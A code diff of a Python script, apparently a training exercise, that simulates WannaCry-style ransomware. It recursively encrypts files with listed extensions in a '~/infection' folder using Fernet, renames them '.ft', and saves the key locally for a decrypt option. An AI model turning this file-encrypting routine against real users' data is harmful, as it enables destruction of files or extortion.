@@ -1,62 +1,92 @@
 import argparse
 import os
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
+import pathlib
+from cryptography.fernet import Fernet
 
 VERSION = '1.0.0'
-EXTESNIONS = open("wannacry_extension.txt", 'r').readlines()
+EXTESNIONS = open("wannacry_extension.txt", 'r').read().splitlines()
 
-def get_key(path):
+def decrypt(key, file, args):
     try:
-        with open(path, 'r') as file:
-            key = file.read()
-            if len(key) < 16 or len(key) > 32:
-                raise Exception('Key lenght has to be at lesat 16 bytes and maximum 32')
-            return key.encode().ljust(32, b'\0')[:32]
-    except Exception as e:
-        print(e)
-        exit(1)
-
-def decrypt_files(file,args):
-    print('Not done yet')
-
-def encrypt(file, args):
-    key = get_key(args.KEY)
-    iv = os.urandom(32)
-    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
-    try:
+        fernet = Fernet(key)
         with open(file, 'rb') as f:
             plaintext = f.read()
-        ciphertext = iv + cipher.encrypt(pad(plaintext, AES))
+        ciphertext = fernet.decrypt(plaintext)
         with open(file , 'wb') as f:
-            file.write(ciphertext)
-            new = os.path.join(file, '.ft')
+            f.write(ciphertext)
+            new = '.'.join(file.split('.')[:-1])
+            if args.s is False:
+                print(f'{file} was decrypted')
             os.rename(file, new)
     except Exception as e:
         print(f'{file}: {e}')
 
-def encrypt_files(dir, args):
+def decrypt_files(key, dir,args):
     for file in os.listdir(dir):
-        if os.path.isdir(file):
-            encrypt_files(file, args)
+        file_path = os.path.join(dir, file)
+        if os.path.isdir(file_path):
+            decrypt_files(key, file_path, args)
         else:
-            if file.endswith(EXTESNIONS):
-                encrypt(file, args)
+            if file.split('.')[-1] == 'ft':
+                decrypt(key, file_path, args)
+
+def encrypt(key, file, args):
+    try:
+        fernet = Fernet(key)
+        with open(file, 'rb') as f:
+            plaintext = f.read()
+        ciphertext = fernet.encrypt(plaintext)
+        with open(file , 'wb') as f:
+            f.write(ciphertext)
+            new = f'{file}.ft'
+            if args.s is False:
+                print(f'{file} was ecnrypted')
+            os.rename(file, new)
+    except Exception as e:
+        print(f'{file}: {e}')
+
+def encrypt_files(key, dir, args):
+    for file in os.listdir(dir):
+        file_path = os.path.join(dir,file)
+        if os.path.isdir(file_path):
+            encrypt_files(key, file_path, args)
+        else:
+            ext = file_path.split('.')[-1]
+            if ext in EXTESNIONS:
+                encrypt(key, file_path, args)
+            elif ext == 'ft':
+                print(f'{file_path} is allready encrypted, skipping...')
+                continue
 
 def main():
     parser = argparse.ArgumentParser(description="Encrypt/decrypt file types infected by wannacry virus")
     parser.add_argument('-v', action='store_true', default=False, help='Display version of the program')
-    parser.add_argument('-r',action='store_true', default=False, help='Reverse the infection')
+    parser.add_argument('-r',type=pathlib.Path, default=None, help='Reverse the infection using the generated key')
     parser.add_argument('-s', action='store_true', default=False, help='No output for encryption')
-    parser.add_argument('KEY', type=os.path, help='Encryption/decrytion key path')
     args = parser.parse_args()
 
-    if not os.path.isfile(args.KEY):
-        parser.error(f'{args.KEY} doesn\'t exist')
-    if args.r == True:
-        decrypt_files('~/infection',args)
+    if args.v is not False:
+        print(f'Version: {VERSION}')
+    home_path = os.path.expanduser('~')
+    infec_dir = os.path.join(home_path, 'infection')
+    if args.r is not None:
+        if os.path.exists(args.r):
+            key = open(args.r ,'rb').read()
+            decrypt_files(key, infec_dir ,args)
+        else:
+            parser.error('Key path not available')
+        print('Decrytion done')
     else:
-        encrypt_files('~/infection', args)
+        key_path = os.path.join(os.getcwd(), 'key')
+        if not os.path.exists(key_path):
+            key = Fernet.generate_key()
+            with open(key_path, 'wb') as file:
+                file.write(key)
+        else:
+            print('Key file allready exists, using the generated key')
+            key = open(key_path, 'rb').read()
+        encrypt_files(key, infec_dir, args)
+        print('Encrytion done')
 
 if __name__ == "__main__":
     main()
